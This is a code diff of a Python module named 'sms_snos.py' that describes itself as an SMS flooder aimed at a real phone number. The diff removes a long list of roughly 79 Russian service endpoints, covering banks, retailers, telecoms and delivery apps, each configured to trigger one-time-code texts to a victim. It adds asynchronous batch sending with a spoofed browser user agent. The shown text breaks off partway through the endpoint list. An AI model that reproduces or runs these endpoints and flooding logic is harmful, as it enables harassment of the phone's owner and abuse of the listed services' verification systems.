@@ -1,17 +1,13 @@
 """
 Brown V2 | sms_snos.py
-Метод: SMS флуд на реальный номер телефона через регистрационные API российских сервисов
-- 70+ эндпоинтов российских сервисов
-- Асинхронные запросы через aiohttp (пачками по 10)
-- Лог-файл после завершения
+Метод: SMS флуд на реальный номер телефона
+Эндпоинты: Beast Bomber (github.com/un1cum/Beast_Bomber) — проверенные рабочие запросы
 """
 
 import asyncio
-import json
 import os
 import random
 import string
-import time
 
 import aiohttp
 from utils import now_msk
@@ -19,8 +15,8 @@ from utils import now_msk
 LOG_FOLDER = "logs"
 os.makedirs(LOG_FOLDER, exist_ok=True)
 
-TIMEOUT = 10
-BATCH_SIZE = 10
+TIMEOUT = 8
+BATCH_SIZE = 8
 
 bot = None
 
@@ -30,1345 +26,770 @@ def set_bot_sms(b):
     bot = b
 
 
-def _rand_str(n=8):
-    return "".join(random.choices(string.ascii_lowercase, k=n))
-
-
 def _rand_email():
-    return f"{_rand_str(8)}@{_rand_str(5)}.ru"
+    chars = string.ascii_lowercase
+    return f"{''.join(random.choices(chars, k=9))}@{''.join(random.choices(chars, k=5))}.ru"
 
 
-def _rand_name():
-    names = ["Иван", "Алексей", "Дмитрий", "Сергей", "Андрей", "Михаил", "Павел", "Николай", "Артём", "Денис"]
-    return random.choice(names)
-
-
-def _rand_lastname():
-    lastnames = ["Иванов", "Петров", "Сидоров", "Смирнов", "Козлов", "Новиков", "Морозов", "Попов", "Лебедев", "Соколов"]
-    return random.choice(lastnames)
-
-
-def _build_services(phone: str) -> list[dict]:
+async def _run_all(session: aiohttp.ClientSession, phone: str) -> list[tuple[str, str, str]]:
     """
-    Возвращает список сервисов.
-    Каждый элемент: {name, method, url, headers, data/json, success_codes}
-    phone — в формате 79991234567 (без +)
+    phone — формат 79991234567 (без +)
+    Возвращает список (name, icon, code)
     """
-    phone_plus = f"+{phone}"
-    phone_7 = phone if phone.startswith("7") else f"7{phone}"
-    phone_8 = f"8{phone[1:]}" if phone.startswith("7") else phone
+    results = []
+    user = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
+
+    # Вспомогательные форматы
+    p = phone          # 79991234567
+    pp = "+" + phone   # +79991234567
     email = _rand_email()
-    fname = _rand_name()
-    lname = _rand_lastname()
 
-    services = [
-        # ── 1. Wildberries ──────────────────────────────────────────────────
-        {
-            "name": "Wildberries",
-            "method": "POST",
-            "url": "https://user-order.wildberries.ru/api/v2/auth/login",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
-            },
-            "json": {"phone": int(phone_7), "deviceId": _rand_str(16)},
-            "success_codes": [200, 204, 400],
-        },
-        # ── 2. Ozon ─────────────────────────────────────────────────────────
-        {
-            "name": "Ozon",
-            "method": "POST",
-            "url": "https://api.ozon.ru/composer-api.bx/page/json/v2?url=%2Fapi%2Fentrypoint-api.bx%2Fpage%2Fjson%2Fv2",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-                "x-o3-app-name": "ozonapp_android",
-                "x-o3-app-version": "18.0.0(2300)",
-                "x-o3-device-type": "mobile",
-            },
-            "json": {
-                "url": "/api/composer-api.bx/page/json/v2?url=/accounts/",
-                "params": {"phone": phone_plus},
-            },
-            "success_codes": [200, 400],
-        },
-        # ── 3. DNS-shop ─────────────────────────────────────────────────────
-        {
-            "name": "DNS",
-            "method": "POST",
-            "url": "https://www.dns-shop.ru/user/send-otp/",
-            "headers": {
-                "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": "Mozilla/5.0",
-                "X-Requested-With": "XMLHttpRequest",
-            },
-            "data": f"phone={phone_plus}",
-            "success_codes": [200, 400, 422],
-        },
-        # ── 4. Citilink ─────────────────────────────────────────────────────
-        {
-            "name": "Citilink",
-            "method": "POST",
-            "url": "https://www.citilink.ru/api/login/",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-                "X-Requested-With": "XMLHttpRequest",
-            },
-            "json": {"phone": phone_plus, "agree": True},
-            "success_codes": [200, 400],
-        },
-        # ── 5. Citilink v2 ──────────────────────────────────────────────────
-        {
-            "name": "Citilink v2",
-            "method": "POST",
-            "url": "https://www.citilink.ru/auth/phone/",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400, 422],
-        },
-        # ── 6. Raiffeisen ───────────────────────────────────────────────────
-        {
-            "name": "Raiffeisen",
-            "method": "POST",
-            "url": "https://sso.raiffeisen.ru/auth/realms/Retail/login-actions/authenticate",
-            "headers": {
-                "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "data": f"phone={phone_plus}",
-            "success_codes": [200, 302, 400],
-        },
-        # ── 7. PizzaHut ─────────────────────────────────────────────────────
-        {
-            "name": "PizzaHut",
-            "method": "POST",
-            "url": "https://api.pizzahut.ru/v1/auth/phone/send-otp",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 201, 400],
-        },
-        # ── 8. CIAN ─────────────────────────────────────────────────────────
-        {
-            "name": "CIAN",
-            "method": "POST",
-            "url": "https://api.cian.ru/api/auth/v1/get-code-by-phone/",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 9. Letu (Л'Этуаль) ──────────────────────────────────────────────
-        {
-            "name": "Letu",
-            "method": "POST",
-            "url": "https://letu.ru/api/v1/auth/send-otp",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 10. Eldorado ────────────────────────────────────────────────────
-        {
-            "name": "Eldorado",
-            "method": "POST",
-            "url": "https://www.eldorado.ru/api/login/",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-                "X-Requested-With": "XMLHttpRequest",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 11. DG-Home ─────────────────────────────────────────────────────
-        {
-            "name": "DG-Home",
-            "method": "POST",
-            "url": "https://dg-home.ru/local/ajax/sms.php",
-            "headers": {
-                "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "data": f"phone={phone_plus}",
-            "success_codes": [200, 400],
-        },
-        # ── 12. Orby ────────────────────────────────────────────────────────
-        {
-            "name": "Orby",
-            "method": "POST",
-            "url": "https://orby-brand.ru/ajax/otpAction.php",
-            "headers": {
-                "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "data": f"phone={phone_plus}&action=send",
-            "success_codes": [200, 400],
-        },
-        # ── 13. Profi.ru ────────────────────────────────────────────────────
-        {
-            "name": "Profi.ru",
-            "method": "POST",
-            "url": "https://profi.ru/api/login/phone/",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 14. ABC.ru ──────────────────────────────────────────────────────
-        {
-            "name": "ABC.ru",
-            "method": "POST",
-            "url": "https://abc.ru/api/v1/user/auth/",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 15. Sberhealth ──────────────────────────────────────────────────
-        {
-            "name": "Sberhealth",
-            "method": "POST",
-            "url": "https://api.sberhealth.ru/auth/v1/send-otp",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 16. 1cupis ──────────────────────────────────────────────────────
-        {
-            "name": "1cupis",
-            "method": "POST",
-            "url": "https://1cupis.ru/api/user/sms/code",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 17. Gulliver ────────────────────────────────────────────────────
-        {
-            "name": "Gulliver",
-            "method": "POST",
-            "url": "https://gullivermarket.com/personal/sms-login/",
-            "headers": {
-                "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "data": f"phone={phone_plus}",
-            "success_codes": [200, 400],
-        },
-        # ── 18. Mosmetro ────────────────────────────────────────────────────
-        {
-            "name": "Mosmetro",
-            "method": "POST",
-            "url": "https://login.mosmetro.ru/auth/v1/phone/",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 19. Uteka ───────────────────────────────────────────────────────
-        {
-            "name": "Uteka",
-            "method": "POST",
-            "url": "https://uteka.ru/api/user/sms/",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 20. Madyart ─────────────────────────────────────────────────────
-        {
-            "name": "Madyart",
-            "method": "POST",
-            "url": "https://madyart.ru/ajax/sms.php",
-            "headers": {
-                "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "data": f"phone={phone_plus}",
-            "success_codes": [200, 400],
-        },
-        # ── 21. Evraz ───────────────────────────────────────────────────────
-        {
-            "name": "Evraz",
-            "method": "POST",
-            "url": "https://evraz.com/api/auth/send-code/",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 22. Winelab ─────────────────────────────────────────────────────
-        {
-            "name": "Winelab",
-            "method": "POST",
-            "url": "https://winelab.ru/api/v2/auth/login/",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 23. OK.ru ───────────────────────────────────────────────────────
-        {
-            "name": "OK.ru",
-            "method": "POST",
-            "url": "https://ok.ru/api/auth/login",
-            "headers": {
-                "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "data": f"phone={phone_plus}",
-            "success_codes": [200, 400],
-        },
-        # ── 24. ВкусВилл ────────────────────────────────────────────────────
-        {
-            "name": "ВкусВилл",
-            "method": "POST",
-            "url": "https://api.vkusvill.ru/api/v2/user/send-code",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_7},
-            "success_codes": [200, 400],
-        },
-        # ── 25. Яндекс.Еда ──────────────────────────────────────────────────
-        {
-            "name": "Яндекс.Еда",
-            "method": "POST",
-            "url": "https://eda.yandex.ru/api/v1/auth/request-code",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 26. Delivery Club ────────────────────────────────────────────────
-        {
-            "name": "DeliveryClub",
-            "method": "POST",
-            "url": "https://api.delivery-club.ru/api11/auth",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-                "X-Version": "11.0.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 27. Додо Пицца ───────────────────────────────────────────────────
-        {
-            "name": "Dodo Pizza",
-            "method": "POST",
-            "url": "https://auth.dodois.io/connect/token",
-            "headers": {
-                "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "data": f"grant_type=phone&phone={phone_plus}&platform=web&countryCode=ru",
-            "success_codes": [200, 400],
-        },
-        # ── 28. Burger King ──────────────────────────────────────────────────
-        {
-            "name": "Burger King",
-            "method": "POST",
-            "url": "https://burgerking.ru/api/v1/sms/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 29. KFC ─────────────────────────────────────────────────────────
-        {
-            "name": "KFC",
-            "method": "POST",
-            "url": "https://api.kfc.com/api/auth/v1/phone/otp",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-                "X-RBI-Version": "7.3.4",
-            },
-            "json": {"phone": phone_plus, "countryCode": "RU"},
-            "success_codes": [200, 400],
-        },
-        # ── 30. Самокат ──────────────────────────────────────────────────────
-        {
-            "name": "Самокат",
-            "method": "POST",
-            "url": "https://api.samokat.ru/v1/auth/send-code",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 31. Яндекс.Маркет ────────────────────────────────────────────────
-        {
-            "name": "Яндекс.Маркет",
-            "method": "POST",
-            "url": "https://market.yandex.ru/api/checkout/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 32. Мегафон ──────────────────────────────────────────────────────
-        {
-            "name": "Мегафон",
-            "method": "POST",
-            "url": "https://api.megafon.ru/auth/v1/send-otp",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"msisdn": phone_7},
-            "success_codes": [200, 400],
-        },
-        # ── 33. Билайн ───────────────────────────────────────────────────────
-        {
-            "name": "Билайн",
-            "method": "POST",
-            "url": "https://my.beeline.ru/api/v1/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_7},
-            "success_codes": [200, 400],
-        },
-        # ── 34. МТС ──────────────────────────────────────────────────────────
-        {
-            "name": "МТС",
-            "method": "POST",
-            "url": "https://api.mts.ru/auth/v2/send-code",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 35. Теле2 ────────────────────────────────────────────────────────
-        {
-            "name": "Теле2",
-            "method": "POST",
-            "url": "https://mapi.tele2.ru/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 36. Avito ────────────────────────────────────────────────────────
-        {
-            "name": "Avito",
-            "method": "POST",
-            "url": "https://api.avito.ru/core/v1/accounts/phone/login",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 37. HeadHunter ───────────────────────────────────────────────────
-        {
-            "name": "HeadHunter",
-            "method": "POST",
-            "url": "https://hh.ru/oauth/token/phone",
-            "headers": {
-                "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "data": f"phone={phone_plus}&client_id=HH&grant_type=phone_verification",
-            "success_codes": [200, 400],
-        },
-        # ── 38. Ленточка / Лента ─────────────────────────────────────────────
-        {
-            "name": "Лента",
-            "method": "POST",
-            "url": "https://lenta.com/api/v1/user/send-sms",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 39. Перекрёсток ──────────────────────────────────────────────────
-        {
-            "name": "Перекрёсток",
-            "method": "POST",
-            "url": "https://www.perekrestok.ru/api/customer/v2/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_7},
-            "success_codes": [200, 400],
-        },
-        # ── 40. Пятёрочка ────────────────────────────────────────────────────
-        {
-            "name": "Пятёрочка",
-            "method": "POST",
-            "url": "https://www.pyaterochka.ru/api/customer/v2/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_7},
-            "success_codes": [200, 400],
-        },
-        # ── 41. М.Видео ──────────────────────────────────────────────────────
-        {
-            "name": "М.Видео",
-            "method": "POST",
-            "url": "https://www.mvideo.ru/bff/mobile/auth/otp/send",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 42. Газпромбанк ──────────────────────────────────────────────────
-        {
-            "name": "Газпромбанк",
-            "method": "POST",
-            "url": "https://online.gazprombank.ru/auth/v1/sms/send",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 43. Росбанк ──────────────────────────────────────────────────────
-        {
-            "name": "Росбанк",
-            "method": "POST",
-            "url": "https://rosbank.ru/api/auth/v1/send-sms",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 44. ПСБ ──────────────────────────────────────────────────────────
-        {
-            "name": "ПСБ",
-            "method": "POST",
-            "url": "https://ib.psbank.ru/api/auth/v2/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 45. Ренессанс ────────────────────────────────────────────────────
-        {
-            "name": "Ренессанс",
-            "method": "POST",
-            "url": "https://api.rencredit.ru/auth/v1/otp/send",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 46. Совкомбанк ───────────────────────────────────────────────────
-        {
-            "name": "Совкомбанк",
-            "method": "POST",
-            "url": "https://sovcombank.ru/api/v1/sms/send",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 47. ДомКлик ──────────────────────────────────────────────────────
-        {
-            "name": "ДомКлик",
-            "method": "POST",
-            "url": "https://domclick.ru/api/v2/user/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 48. Lamoda ───────────────────────────────────────────────────────
-        {
-            "name": "Lamoda",
-            "method": "POST",
-            "url": "https://api.lamoda.ru/api/v5/user/sendAuthCode",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 49. Золотое Яблоко ───────────────────────────────────────────────
-        {
-            "name": "Золотое Яблоко",
-            "method": "POST",
-            "url": "https://goldapple.ru/api/v1/auth/send-code",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 50. Rendez-Vous ──────────────────────────────────────────────────
-        {
-            "name": "Rendez-Vous",
-            "method": "POST",
-            "url": "https://rendez-vous.ru/api/v1/user/sms/auth",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 51. FixPrice ─────────────────────────────────────────────────────
-        {
-            "name": "FixPrice",
-            "method": "POST",
-            "url": "https://fix-price.com/api/v1/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 52. Детский мир ──────────────────────────────────────────────────
-        {
-            "name": "Детский мир",
-            "method": "POST",
-            "url": "https://www.detmir.ru/api/v1/auth/phone/otp",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 53. Снежная Королева ─────────────────────────────────────────────
-        {
-            "name": "Снежная Королева",
-            "method": "POST",
-            "url": "https://snkol.ru/api/v1/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 54. Магнит ───────────────────────────────────────────────────────
-        {
-            "name": "Магнит",
-            "method": "POST",
-            "url": "https://magnit.ru/api/v2/auth/login/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 55. Ашан ─────────────────────────────────────────────────────────
-        {
-            "name": "Ашан",
-            "method": "POST",
-            "url": "https://www.auchan.ru/api/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 56. СберМаркет ───────────────────────────────────────────────────
-        {
-            "name": "СберМаркет",
-            "method": "POST",
-            "url": "https://sbermarket.ru/api/v3/auth/sms",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 57. Лабиринт ─────────────────────────────────────────────────────
-        {
-            "name": "Лабиринт",
-            "method": "POST",
-            "url": "https://www.labirint.ru/ajax/auth/phone/",
-            "headers": {
-                "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "data": f"phone={phone_plus}",
-            "success_codes": [200, 400],
-        },
-        # ── 58. Book24 ───────────────────────────────────────────────────────
-        {
-            "name": "Book24",
-            "method": "POST",
-            "url": "https://book24.ru/api/v1/auth/send-code/",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 59. Читай-город ──────────────────────────────────────────────────
-        {
-            "name": "Читай-город",
-            "method": "POST",
-            "url": "https://www.chitai-gorod.ru/api/v1/auth/send-code/",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 60. Apteka.ru ────────────────────────────────────────────────────
-        {
-            "name": "Apteka.ru",
-            "method": "POST",
-            "url": "https://api.apteka.ru/Account/Phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 61. 36.6 ─────────────────────────────────────────────────────────
-        {
-            "name": "36.6",
-            "method": "POST",
-            "url": "https://apteki.366.ru/api/v2/auth/phone/send-otp",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 62. СДЭК ─────────────────────────────────────────────────────────
-        {
-            "name": "СДЭК",
-            "method": "POST",
-            "url": "https://api.cdek.ru/v2/oauth/token/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 63. Boxberry ─────────────────────────────────────────────────────
-        {
-            "name": "Boxberry",
-            "method": "POST",
-            "url": "https://api.boxberry.ru/api/v1/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 64. Яндекс.Такси ─────────────────────────────────────────────────
-        {
-            "name": "Яндекс.Такси",
-            "method": "POST",
-            "url": "https://taxi-authproxy.taxi.yandex.net/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 65. Wheely ───────────────────────────────────────────────────────
-        {
-            "name": "Wheely",
-            "method": "POST",
-            "url": "https://wheely.com/api/2/auth/send_code",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 66. SkiPass ──────────────────────────────────────────────────────
-        {
-            "name": "SkiPass",
-            "method": "POST",
-            "url": "https://skipassmarket.ru/api/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 67. Fotosklad ────────────────────────────────────────────────────
-        {
-            "name": "Fotosklad",
-            "method": "POST",
-            "url": "https://www.fotosklad.ru/api/v1/sms-auth/",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 68. ВсеИнструменты ───────────────────────────────────────────────
-        {
-            "name": "ВсеИнструменты",
-            "method": "POST",
-            "url": "https://www.vseinstrumenti.ru/api/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 69. Леруа Мерлен ─────────────────────────────────────────────────
-        {
-            "name": "Леруа Мерлен",
-            "method": "POST",
-            "url": "https://leroymerlin.ru/api/v2/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 70. Петрович ─────────────────────────────────────────────────────
-        {
-            "name": "Петрович",
-            "method": "POST",
-            "url": "https://petrovich.ru/api/v1/auth/sms",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 71. Ikea ─────────────────────────────────────────────────────────
-        {
-            "name": "IKEA",
-            "method": "POST",
-            "url": "https://www.ikea.com/ru/ru/customer/auth/v1/phone/code",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 72. Hoff ─────────────────────────────────────────────────────────
-        {
-            "name": "Hoff",
-            "method": "POST",
-            "url": "https://hoff.ru/api/v2/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 73. Домодедово ───────────────────────────────────────────────────
-        {
-            "name": "Домодедово",
-            "method": "POST",
-            "url": "https://dme.ru/api/v1/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 74. РЖД ──────────────────────────────────────────────────────────
-        {
-            "name": "РЖД",
-            "method": "POST",
-            "url": "https://lk.rzd.ru/api/v1/auth/phone/otp",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 75. Аэрофлот ─────────────────────────────────────────────────────
-        {
-            "name": "Аэрофлот",
-            "method": "POST",
-            "url": "https://www.aeroflot.ru/api/auth/send-otp",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 76. Туту.ру ──────────────────────────────────────────────────────
-        {
-            "name": "Туту.ру",
-            "method": "POST",
-            "url": "https://www.tutu.ru/api/v1/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 77. OnlineTours ──────────────────────────────────────────────────
-        {
-            "name": "OnlineTours",
-            "method": "POST",
-            "url": "https://www.onlinetours.ru/api/v1/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 78. Яндекс.Путешествия ───────────────────────────────────────────
-        {
-            "name": "Яндекс.Путешествия",
-            "method": "POST",
-            "url": "https://travel.yandex.ru/api/v1/user/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 79. Instamart ────────────────────────────────────────────────────
-        {
-            "name": "Instamart",
-            "method": "POST",
-            "url": "https://api.instmart.ru/v4/login",
-            "headers": {
